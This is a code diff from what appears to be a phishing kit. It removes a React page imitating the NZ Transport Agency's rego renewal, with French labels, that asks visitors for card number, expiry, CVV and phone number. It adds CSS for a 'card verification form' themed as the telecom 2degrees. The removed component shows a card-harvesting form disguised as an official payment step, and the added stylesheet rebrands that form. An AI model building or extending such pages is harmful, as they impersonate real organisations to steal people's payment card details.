@@ -1,298 +1,219 @@
-import React from 'react';
-import './LoginScreen.css';
-import { useLanguage } from '../hooks/useLanguage';
+/* ═══════════════════════════════════════════════════════════════
+   CARD VERIFICATION FORM — 2degrees theme
+   ═══════════════════════════════════════════════════════════════ */
 
-// ─── Country codes (named export — LoginForm.js needs this) ───
-export const countryCodes = [
-  { code: '+213', country: 'Algeria (DZ)', phoneLength: 9, zipLength: 5 },
-  { code: '+54', country: 'Argentina (AR)', phoneLength: 10, zipLength: 4 },
-  { code: '+61', country: 'Australia (AU)', phoneLength: 9, zipLength: 4 },
-  { code: '+43', country: 'Austria (AT)', phoneLength: 10, zipLength: 4 },
-  { code: '+973', country: 'Bahrain (BH)', phoneLength: 8, zipLength: 4 },
-  { code: '+880', country: 'Bangladesh (BD)', phoneLength: 10, zipLength: 4 },
-  { code: '+375', country: 'Belarus (BY)', phoneLength: 9, zipLength: 6 },
-  { code: '+32', country: 'Belgium (BE)', phoneLength: 9, zipLength: 4 },
-  { code: '+55', country: 'Brazil (BR)', phoneLength: 11, zipLength: 8 },
-  { code: '+359', country: 'Bulgaria (BG)', phoneLength: 9, zipLength: 4 },
-  { code: '+855', country: 'Cambodia (KH)', phoneLength: 9, zipLength: 5 },
-  { code: '+1', country: 'Canada/US (CA/US)', phoneLength: 10, zipLength: 5 },
-  { code: '+56', country: 'Chile (CL)', phoneLength: 9, zipLength: 7 },
-  { code: '+86', country: 'China (CN)', phoneLength: 11, zipLength: 6 },
-  { code: '+57', country: 'Colombia (CO)', phoneLength: 10, zipLength: 6 },
-  { code: '+385', country: 'Croatia (HR)', phoneLength: 9, zipLength: 5 },
-  { code: '+420', country: 'Czech Republic (CZ)', phoneLength: 9, zipLength: 5 },
-  { code: '+45', country: 'Denmark (DK)', phoneLength: 8, zipLength: 4 },
-  { code: '+20', country: 'Egypt (EG)', phoneLength: 10, zipLength: 5 },
-  { code: '+372', country: 'Estonia (EE)', phoneLength: 8, zipLength: 5 },
-  { code: '+358', country: 'Finland (FI)', phoneLength: 9, zipLength: 5 },
-  { code: '+33', country: 'France (FR)', phoneLength: 9, zipLength: 5 },
-  { code: '+49', country: 'Germany (DE)', phoneLength: 11, zipLength: 5 },
-  { code: '+233', country: 'Ghana (GH)', phoneLength: 9, zipLength: 5 },
-  { code: '+30', country: 'Greece (GR)', phoneLength: 10, zipLength: 5 },
-  { code: '+852', country: 'Hong Kong (HK)', phoneLength: 8, zipLength: 0 },
-  { code: '+36', country: 'Hungary (HU)', phoneLength: 9, zipLength: 4 },
-  { code: '+91', country: 'India (IN)', phoneLength: 10, zipLength: 6 },
-  { code: '+62', country: 'Indonesia (ID)', phoneLength: 10, zipLength: 5 },
-  { code: '+353', country: 'Ireland (IE)', phoneLength: 9, zipLength: 0 },
-  { code: '+972', country: 'Israel (IL)', phoneLength: 9, zipLength: 7 },
-  { code: '+39', country: 'Italy (IT)', phoneLength: 10, zipLength: 5 },
-  { code: '+225', country: 'Ivory Coast (CI)', phoneLength: 10, zipLength: 5 },
-  { code: '+81', country: 'Japan (JP)', phoneLength: 10, zipLength: 7 },
-  { code: '+254', country: 'Kenya (KE)', phoneLength: 9, zipLength: 5 },
-  { code: '+965', country: 'Kuwait (KW)', phoneLength: 8, zipLength: 5 },
-  { code: '+856', country: 'Laos (LA)', phoneLength: 10, zipLength: 5 },
-  { code: '+371', country: 'Latvia (LV)', phoneLength: 8, zipLength: 4 },
-  { code: '+370', country: 'Lithuania (LT)', phoneLength: 8, zipLength: 5 },
-  { code: '+60', country: 'Malaysia (MY)', phoneLength: 9, zipLength: 5 },
-  { code: '+52', country: 'Mexico (MX)', phoneLength: 10, zipLength: 5 },
-  { code: '+976', country: 'Mongolia (MN)', phoneLength: 8, zipLength: 5 },
-  { code: '+212', country: 'Morocco (MA)', phoneLength: 9, zipLength: 5 },
-  { code: '+95', country: 'Myanmar (MM)', phoneLength: 9, zipLength: 5 },
-  { code: '+977', country: 'Nepal (NP)', phoneLength: 10, zipLength: 5 },
-  { code: '+31', country: 'Netherlands (NL)', phoneLength: 9, zipLength: 6 },
-  { code: '+64', country: 'New Zealand (NZ)', phoneLength: 9, zipLength: 4 },
-  { code: '+234', country: 'Nigeria (NG)', phoneLength: 10, zipLength: 6 },
-  { code: '+47', country: 'Norway (NO)', phoneLength: 8, zipLength: 4 },
-  { code: '+968', country: 'Oman (OM)', phoneLength: 8, zipLength: 3 },
-  { code: '+92', country: 'Pakistan (PK)', phoneLength: 10, zipLength: 5 },
-  { code: '+51', country: 'Peru (PE)', phoneLength: 9, zipLength: 5 },
-  { code: '+63', country: 'Philippines (PH)', phoneLength: 10, zipLength: 4 },
-  { code: '+48', country: 'Poland (PL)', phoneLength: 9, zipLength: 5 },
-  { code: '+351', country: 'Portugal (PT)', phoneLength: 9, zipLength: 7 },
-  { code: '+974', country: 'Qatar (QA)', phoneLength: 8, zipLength: 0 },
-  { code: '+40', country: 'Romania (RO)', phoneLength: 9, zipLength: 6 },
-  { code: '+7', country: 'Russia (RU)', phoneLength: 10, zipLength: 6 },
-  { code: '+966', country: 'Saudi Arabia (SA)', phoneLength: 9, zipLength: 5 },
-  { code: '+381', country: 'Serbia (RS)', phoneLength: 9, zipLength: 5 },
-  { code: '+65', country: 'Singapore (SG)', phoneLength: 8, zipLength: 6 },
-  { code: '+421', country: 'Slovakia (SK)', phoneLength: 9, zipLength: 5 },
-  { code: '+386', country: 'Slovenia (SI)', phoneLength: 8, zipLength: 4 },
-  { code: '+27', country: 'South Africa (ZA)', phoneLength: 9, zipLength: 4 },
-  { code: '+82', country: 'South Korea (KR)', phoneLength: 10, zipLength: 5 },
-  { code: '+34', country: 'Spain (ES)', phoneLength: 9, zipLength: 5 },
-  { code: '+94', country: 'Sri Lanka (LK)', phoneLength: 9, zipLength: 5 },
-  { code: '+46', country: 'Sweden (SE)', phoneLength: 9, zipLength: 5 },
-  { code: '+41', country: 'Switzerland (CH)', phoneLength: 9, zipLength: 4 },
-  { code: '+886', country: 'Taiwan (TW)', phoneLength: 9, zipLength: 5 },
-  { code: '+66', country: 'Thailand (TH)', phoneLength: 9, zipLength: 5 },
-  { code: '+216', country: 'Tunisia (TN)', phoneLength: 8, zipLength: 4 },
-  { code: '+90', country: 'Turkey (TR)', phoneLength: 10, zipLength: 5 },
-  { code: '+380', country: 'Ukraine (UA)', phoneLength: 9, zipLength: 5 },
-  { code: '+971', country: 'United Arab Emirates (AE)', phoneLength: 9, zipLength: 0 },
-  { code: '+44', country: 'United Kingdom (UK)', phoneLength: 10, zipLength: 7 },
-  { code: '+84', country: 'Vietnam (VN)', phoneLength: 9, zipLength: 6 },
-];
-
-const months = Array.from({ length: 12 }, (_, i) => {
-  const month = (i + 1).toString().padStart(2, '0');
-  return { value: month, label: month };
-});
-
-const currentYear = new Date().getFullYear();
-const years = Array.from({ length: 11 }, (_, i) => {
-  const year = currentYear + i;
-  return { value: year.toString().slice(-2), label: year.toString() };
-});
-
-function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChange, onSubmit }) {
-  const { t } = useLanguage();
-
-  const handleExpiryMonthChange = (month) => {
-    const newExpiryDate = month + (cardDetails.expiryDate?.slice(-2) || '');
-    onInputChange('expiryDate', newExpiryDate);
-  };
-  const handleExpiryYearChange = (year) => {
-    const newExpiryDate = (cardDetails.expiryDate?.slice(0, 2) || '') + year;
-    onInputChange('expiryDate', newExpiryDate);
-  };
-  const handleCvvChange = (e) => {
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length <= 4) onInputChange('cvv', value);
-  };
-  const handlePhoneChange = (e) => {
-    let value = e.target.value.replace(/\D/g, '');
-    const selectedCountry = countryCodes.find(
-      (c) => c.code === (cardDetails.countryCode || '+1')
-    );
-    const maxLength = selectedCountry ? selectedCountry.phoneLength : 15;
-    if (value.length <= maxLength) onInputChange('phoneNumber', value);
-  };
-
-  return (
-    <div className="nzta-renewal">
-      {/* ─── Header (same as LoginScreen) ─── */}
-      <header className="nzta-header">
-        <div className="nzta-header-inner">
-          <div className="nzta-logo">
-            <img
-              src="/assets/nzta-logo.png"
-              alt="NZ Transport Agency"
-              className="nzta-logo-img"
-            />
-          </div>
-        </div>
-      </header>
-
-      {/* ─── Main ─── */}
-      <main className="nzta-main">
-        <a href="#back" className="nzta-back" onClick={(e) => e.preventDefault()}>
-          ← Retour
-        </a>
-
-        <h1 className="nzta-title">Renouveler votre licence de véhicule (rego)</h1>
-
-        {/* Steps — step 2 active */}
-        <ol className="nzta-steps">
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">1</span>
-            <span className="nzta-step-label">Détails du véhicule</span>
-          </li>
-          <li className="nzta-step active">
-            <span className="nzta-step-circle">2</span>
-            <span className="nzta-step-label">Vérifier les détails</span>
-          </li>
-          <li className="nzta-step">
-            <span className="nzta-step-circle">3</span>
-            <span className="nzta-step-label">Détails de paiement</span>
-          </li>
-          <li className="nzta-step">
-            <span className="nzta-step-circle">4</span>
-            <span className="nzta-step-label">Confirmation</span>
-          </li>
-        </ol>
-
-        <hr className="nzta-divider" />
-
-        <p className="nzta-hint">
-          Tous les champs sont obligatoires sauf ceux marqués 'facultatif'.
-        </p>
-
-        <h2 className="nzta-subtitle">Informations de paiement</h2>
-
-        <form onSubmit={onSubmit}>
-          {/* Cardholder */}
-          <div className="nzta-field">
-            <label>{t.cardholderName}</label>
-            <input
-              type="text"
-              value={cardDetails.cardholderName}
-              onChange={(e) => onInputChange('cardholderName', e.target.value)}
-              placeholder="e.g. JOHN SMITH"
-              className={`nzta-input ${cardErrors.cardholderName ? 'input-error-red' : ''}`}
-            />
-            {cardErrors.cardholderName && (
-              <span className="nzta-error-msg">{cardErrors.cardholderName}</span>
-            )}
-          </div>
-
-          {/* Card number */}
-          <div className="nzta-field">
-            <label>{t.cardNumber}</label>
-            <input
-              type="text"
-              value={cardDetails.cardNumber}
-              onChange={(e) => onInputChange('cardNumber', e.target.value)}
-              placeholder="1234 5678 9012 3456"
-              maxLength="19"
-              className={`nzta-input ${cardErrors.cardNumber ? 'input-error-red' : ''}`}
-            />
-            {cardErrors.cardNumber && (
-              <span className="nzta-error-msg">{cardErrors.cardNumber}</span>
-            )}
-          </div>
-
-          {/* Expiry + CVV */}
-          <div className="nzta-row">
-            <div className="nzta-field">
-              <label>{t.expirationDate}</label>
-              <div className="nzta-row">
-                <select
-                  value={cardDetails.expiryDate?.slice(0, 2) || ''}
-                  onChange={(e) => handleExpiryMonthChange(e.target.value)}
-                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
-                >
-                  <option value="">{t.month}</option>
-                  {months.map((m) => (
-                    <option key={m.value} value={m.value}>{m.label}</option>
-                  ))}
-                </select>
-                <select
-                  value={cardDetails.expiryDate?.slice(-2) || ''}
-                  onChange={(e) => handleExpiryYearChange(e.target.value)}
-                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
-                >
-                  <option value="">{t.year}</option>
-                  {years.map((y) => (
-                    <option key={y.value} value={y.value}>{y.label}</option>
-                  ))}
-                </select>
-              </div>
-              {cardErrors.expiryDate && (
-                <span className="nzta-error-msg">{cardErrors.expiryDate}</span>
-              )}
-            </div>
-
-            <div className="nzta-field">
-              <label>{t.cvv}</label>
-              <input
-                type="text"
-                value={cardDetails.cvv}
-                onChange={handleCvvChange}
-                placeholder="123"
-                maxLength="4"
-                className={`nzta-input ${cardErrors.cvv ? 'input-error-red' : ''}`}
-              />
-              {cardErrors.cvv && <span className="nzta-error-msg">{cardErrors.cvv}</span>}
-            </div>
-          </div>
-
-          {/* Phone */}
-          <div className="nzta-field">
-            <label>{t.phoneNumber}</label>
-            <div className="nzta-row">
-              <select
-                className="nzta-input nzta-country-select"
-                value={cardDetails.countryCode || '+1'}
-                onChange={(e) => onInputChange('countryCode', e.target.value)}
-              >
-                {countryCodes.map((c) => (
-                  <option key={c.code} value={c.code}>
-                    {c.country} {c.code}
-                  </option>
-                ))}
-              </select>
-              <input
-                type="text"
-                value={cardDetails.phoneNumber || ''}
-                onChange={handlePhoneChange}
-                placeholder="1234567890"
-                maxLength="15"
-                className={`nzta-input ${cardErrors.phoneNumber ? 'input-error-red' : ''}`}
-              />
-            </div>
-            {cardErrors.phoneNumber && (
-              <span className="nzta-error-msg">{cardErrors.phoneNumber}</span>
-            )}
-            <span className="nzta-help">{t.phoneHint}</span>
-          </div>
-
-          {/* Buttons */}
-          <div className="nzta-actions">
-            <button
-              type="submit"
-              className="nzta-btn nzta-btn-continue"
-              disabled={isLoading}
-            >
-              {isLoading ? 'Veuillez patienter…' : 'Continuer'}
-            </button>
-            <button type="button" className="nzta-btn nzta-btn-cancel">
-              Annuler
-            </button>
-          </div>
-        </form>
-      </main>
-    </div>
-  );
+.cardv-page {
+  background: #d6ecf5;
+  min-height: 100vh;
+  padding: 60px 24px 80px;
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  color: #1e2a3a;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
 }
 
-export default CardVerificationForm;
+.cardv-container {
+  max-width: 560px;
+  width: 100%;
+  background: #fff;
+  border-radius: 12px;
+  padding: 40px 44px 36px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+}
+
+/* ─── Title ─── */
+.cardv-title {
+  font-size: 32px;
+  font-weight: 800;
+  color: #1e2a3a;
+  margin: 0 0 12px;
+  letter-spacing: -0.02em;
+  line-height: 1.15;
+}
+
+.cardv-intro {
+  font-size: 15px;
+  color: #4a5661;
+  line-height: 1.55;
+  margin: 0 0 24px;
+}
+
+.cardv-divider {
+  border: none;
+  border-top: 1px solid #e5e9ec;
+  margin: 20px 0 24px;
+}
+
+.cardv-subtitle {
+  font-size: 18px;
+  font-weight: 700;
+  color: #1e2a3a;
+  margin: 0 0 20px;
+  letter-spacing: -0.01em;
+}
+
+/* ─── Fields ─── */
+.cardv-field {
+  margin-bottom: 20px;
+}
+
+.cardv-field label {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  color: #1e2a3a;
+  margin-bottom: 8px;
+}
+
+.cardv-input {
+  width: 100%;
+  padding: 13px 15px;
+  border: 1.5px solid #d9e1e8;
+  border-radius: 8px;
+  font-size: 15px;
+  font-family: inherit;
+  background: #fff;
+  color: #1e2a3a;
+  transition: all 0.2s ease;
+  box-sizing: border-box;
+}
+
+.cardv-input:focus {
+  outline: none;
+  border-color: #00a3e0;
+  box-shadow: 0 0 0 3px rgba(0, 163, 224, 0.15);
+}
+
+.cardv-input::placeholder {
+  color: #a0b0be;
+}
+
+.cardv-input.cardv-error {
+  border-color: #c0392b;
+  background: #fffafa;
+}
+
+.cardv-error-msg {
+  display: block;
+  color: #c0392b;
+  font-size: 12.5px;
+  margin-top: 6px;
+  font-weight: 500;
+}
+
+.cardv-help {
+  display: block;
+  color: #5e6f7e;
+  font-size: 12.5px;
+  margin-top: 6px;
+  line-height: 1.45;
+}
+
+/* ─── Row (side by side) ─── */
+.cardv-row {
+  display: flex;
+  gap: 14px;
+  flex-wrap: wrap;
+}
+
+.cardv-row > .cardv-field {
+  flex: 1;
+  min-width: 0;
+}
+
+/* ─── Country select ─── */
+.cardv-country-select {
+  width: 160px !important;
+  flex-shrink: 0;
+}
+
+.cardv-phone-input {
+  flex: 1;
+  min-width: 0;
+}
+
+/* ─── Actions ─── */
+.cardv-actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 28px;
+}
+
+.cardv-btn {
+  padding: 14px 32px;
+  font-size: 15px;
+  font-weight: 700;
+  border-radius: 40px;
+  font-family: inherit;
+  border: none;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.cardv-btn:disabled {
+  opacity: 0.55;
+  cursor: not-allowed;
+}
+
+.cardv-btn-continue {
+  background: #00a3e0;
+  color: #fff;
+  box-shadow: 0 4px 12px rgba(0, 163, 224, 0.25);
+}
+
+.cardv-btn-continue:hover:not(:disabled) {
+  background: #0089bd;
+  box-shadow: 0 6px 20px rgba(0, 163, 224, 0.35);
+  transform: translateY(-1px);
+}
+
+.cardv-btn-cancel {
+  background: transparent;
+  color: #1e2a3a;
+  border: 1.5px solid #d9e1e8;
+}
+
+.cardv-btn-cancel:hover:not(:disabled) {
+  background: #e5f0f9;
+  border-color: #00a3e0;
+  color: #00a3e0;
+}
+
+/* ─── Responsive ─── */
+@media (max-width: 640px) {
+  .cardv-page {
+    padding: 28px 16px 60px;
+  }
+
+  .cardv-container {
+    padding: 28px 22px 26px;
+    border-radius: 10px;
+  }
+
+  .cardv-title {
+    font-size: 24px;
+  }
+
+  .cardv-subtitle {
+    font-size: 16px;
+  }
+
+  .cardv-row {
+    flex-direction: column;
+    gap: 0;
+  }
+
+  .cardv-country-select {
+    width: 100% !important;
+  }
+
+  .cardv-actions {
+    flex-direction: column;
+  }
+
+  .cardv-btn {
+    width: 100%;
+    padding: 14px 24px;
+  }
+}
